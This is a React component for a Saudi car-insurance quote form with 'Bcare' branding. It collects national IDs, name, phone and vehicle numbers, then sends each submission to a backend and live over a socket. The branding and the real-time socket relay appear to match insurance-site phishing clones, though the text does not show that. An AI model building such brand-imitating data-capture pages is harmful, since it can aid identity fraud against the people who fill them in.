import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";
import SponsorsSlider from "../components/SponsorsSlider";
import WhyBcare from "../components/WhyBcare";
import WareefDiscounts from "../components/WareefDiscounts";
import WhyChooseBcare from "../components/WhyChooseBcare";
import ApplyFooter from "../components/ApplyFooter";
import FloatingActions from "../components/FloatingActions";
import FormInput, { inputClass } from "../components/apply/FormInput";
import TypeToggle from "../components/apply/TypeToggle";
import RegistrationToggle from "../components/apply/RegistrationToggle";
import CaptchaRow from "../components/apply/CaptchaRow";
import CategoryTabs from "../components/apply/CategoryTabs";
import {
  normalizeSaudiNationalId,
  validateSaudiNationalId,
} from "../utils/saudiNationalId";

const YEARS = Array.from({ length: 28 }, (_, i) => String(2000 + i));

const Apply = ({ setLoading, loading }) => {
  const { t, dir } = useTranslation();
  const [type, setType] = useState("تأمين جديد");
  const [tameenType, setTameenType] = useState("أستمارة");
  const [nationalId, setNationalId] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  const [car_year, setcar_year] = useState("2024");
  const [carHolderName, setCarHolderName] = useState("");
  const [birth_date] = useState("");
  const [Customs_card, setCustomsCard] = useState("");
  const [phone, setPhone] = useState("");
  const [sellerId, setSellerId] = useState("");
  const [captecha, setCapetcha] = useState("");
  const [verfiy, setVrefiy] = useState(Math.floor(1000 + Math.random() * 9000));
  const [consent, setConsent] = useState(false);
  const [error, setError] = useState(false);
  const [load, setLoad] = useState(false);
  const navigate = useNavigate();

  const refreshCaptcha = () =>
    setVrefiy(Math.floor(1000 + Math.random() * 9000));

  const idFieldError = (value) => {
    const key = validateSaudiNationalId(value, { requireComplete: false });
    return key ? t(key) : undefined;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(false);

    if (!consent) return setError(t("apply.consentRequired"));

    const buyerIdError = validateSaudiNationalId(nationalId);
    if (buyerIdError) return setError(t(buyerIdError));

    if (type === "نقل الملكية") {
      const sellerIdError = validateSaudiNationalId(sellerId);
      if (sellerIdError) {
        return setError(t("errors.sellerIdInvalid"));
      }
    }

    if (String(captecha) !== String(verfiy)) {
      return setError(t("errors.captchaInvalid"));
    }

    setLoad(true);

    const data = {
      type,
      tameenType,
      national_id: normalizeSaudiNationalId(nationalId),
      serialNumber,
      car_year,
      carHolderName,
      sellerId: normalizeSaudiNationalId(sellerId),
      birth_date,
      Customs_card,
      phone,
    };
    try {
      await axios.post(api_route + "/reg", data).then(({ data }) => {
        sessionStorage.setItem("id", data._id);
        socket.emit("bindOrder", data._id);
        socket.emit("newData", data);
        return navigate(`/reg?data=${JSON.stringify(data)}`);
      });
    } catch {
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className="relative flex w-full flex-col items-center bg-[#F8F9FB]"
      dir={dir}
    >
      {load ? (
        <div className="fixed top-0 z-50 flex h-screen w-full items-center justify-center bg-white bg-opacity-60">
          <img src="/logo.svg" className="h-14 w-14" alt="" />
          <div className="flex h-fit w-fit items-center justify-center gap-x-3 rounded-md bg-white p-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              visible={true}
            />
            <span className="text-lg">{t("common.processing")}</span>
          </div>
        </div>
      ) : null}

      <div className="w-full bg-[#146394] px-6 pb-16 pt-6 text-center text-white">
        <h1 className="mb-2 text-2xl font-extrabold ">
          {t("apply.heroTitle")}
        </h1>
        <p className="text-sm leading-relaxed opacity-95">
          {t("apply.heroSubtitle")}
        </p>
      </div>

      <CategoryTabs t={t} />

      <div className="relative z-10 mt-4 w-[92%] rounded-2xl bg-white p-4 shadow-md sm:p-6">
        <TypeToggle
          value={type}
          onChange={setType}
          newLabel={t("apply.newInsurance")}
          transferLabel={t("apply.ownershipTransfer")}
        />

        <form
          className="mt-4 flex w-full flex-col gap-4"
          onSubmit={handleSubmit}
        >
          {type === "تأمين جديد" ? (
            <>
              <FormInput
                label={t("apply.nationalId")}
                value={nationalId}
                onChange={setNationalId}
                required
                dir="ltr"
                inputMode="numeric"
                maxLength={10}
                minLength={10}
                numeric
                normalizeDigits
                error={idFieldError(nationalId)}
              />
            </>
          ) : (
            <>
              <FormInput
                label={t("apply.sellerId")}
                value={sellerId}
                onChange={setSellerId}
                required
                dir="ltr"
                inputMode="numeric"
                maxLength={10}
                minLength={10}
                numeric
                normalizeDigits
                error={idFieldError(sellerId)}
              />
              <FormInput
                label={t("apply.buyerId")}
                value={nationalId}
                onChange={setNationalId}
                required
                dir="ltr"
                inputMode="numeric"
                maxLength={10}
                minLength={10}
                numeric
                normalizeDigits
                error={idFieldError(nationalId)}
              />
              <FormInput
                label={t("apply.applicantName")}
                value={carHolderName}
                onChange={setCarHolderName}
                required
              />
              <FormInput
                label={t("apply.phone")}
                value={phone}
                onChange={setPhone}
                required
                dir="ltr"
                inputMode="numeric"
                maxLength={10}
                minLength={10}
                numeric
              />
            </>
          )}

          <RegistrationToggle
            value={tameenType}
            onChange={setTameenType}
            formLabel={t("apply.form")}
            customsLabel={t("apply.customsCard")}
          />

          {tameenType === "أستمارة" ? (
            <FormInput
              label={t("apply.serialNumber")}
              value={serialNumber}
              onChange={setSerialNumber}
              required
              dir="ltr"
              info
              infoLabel={t("apply.serialNumberInfo")}
            />
          ) : (
            <div className="flex w-full gap-2">
              <label className="flex w-full flex-col gap-1.5 text-sm font-bold text-[#146394]">
                <span>
                  {t("apply.modelYear")}{" "}
                  <span className="text-red-500">*</span>
                </span>
                <select
                  required
                  className={`${inputClass} text-left`}
                  value={car_year}
                  dir="ltr"
                  onChange={(e) => setcar_year(e.target.value)}
                >
                  <option hidden>{t("common.choose")}</option>
                  {YEARS.map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </label>
              <FormInput
                label={t("apply.customsCardNumber")}
                value={Customs_card}
                onChange={setCustomsCard}
                required
                dir="ltr"
              />
            </div>
          )}

          <CaptchaRow
            label={t("apply.captcha")}
            value={captecha}
            onChange={setCapetcha}
            code={verfiy}
            onRefresh={refreshCaptcha}
          />

          {error ? (
            <span className="w-full text-center text-sm text-red-500">
              {error}
            </span>
          ) : null}

          <button
            type="submit"
            className="w-full rounded-full bg-[#F5A623] py-3 text-lg font-bold text-white"
          >
            {loading ? (
              <div className="flex items-center justify-center">
                <TailSpin
                  height="30"
                  width="30"
                  color="white"
                  ariaLabel="tail-spin-loading"
                  radius="1"
                  visible={true}
                />
              </div>
            ) : (
              t("common.showOffers")
            )}
          </button>

          <label className="flex items-start gap-2 text-xs text-[#146394]">
            <input
              type="checkbox"
              required
              checked={consent}
              onChange={(e) => setConsent(e.target.checked)}
              className="mt-0.5 h-4 w-4 shrink-0 accent-[#146394]"
            />
            <span className="text-sm font-extrabold text-[#146394]">{t("apply.consent")}</span>
          </label>
        </form>
      </div>

      <SponsorsSlider />
      <WhyBcare />
      <WareefDiscounts />
      <WhyChooseBcare />
      <ApplyFooter />
      <FloatingActions />
    </div>
  );
};

export default Apply;
